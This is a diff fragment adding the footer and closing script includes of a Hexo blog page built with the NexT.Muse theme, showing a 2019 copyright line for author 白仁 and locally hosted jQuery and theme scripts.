+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
